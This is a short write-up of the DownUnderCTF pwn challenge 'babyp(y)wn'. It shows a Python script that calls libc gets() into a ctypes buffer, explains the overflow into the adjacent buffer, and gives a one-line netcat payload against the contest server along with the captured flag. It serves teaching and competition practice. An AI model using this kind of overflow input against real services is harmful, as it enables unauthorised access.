# babyp(y)wn

CTF Event: DownUnderCTF
Category: Pwn
Difficulty: Easy
Platform: CTFtime
Status: Rooted/Finished
Tags: buffer-overflow

## Description

> Python is memory safe, right?
> 

## Steps

in this challenge, we are provided with a python script that imports libc’s lib.so.6 and sets buffers to 512 then calls the gets function and sets the value to buf1

```python
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

the vulnerability here is that the gets function takes input until it receives a line terminator with that we can overflow the input into buf2 and pass the check at line 8 to get the flag

## Solution

```bash
python -c "print('a'*512+'DUCTF')" | nc 2022.ductf.dev 30021
```

## Flag

`DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}`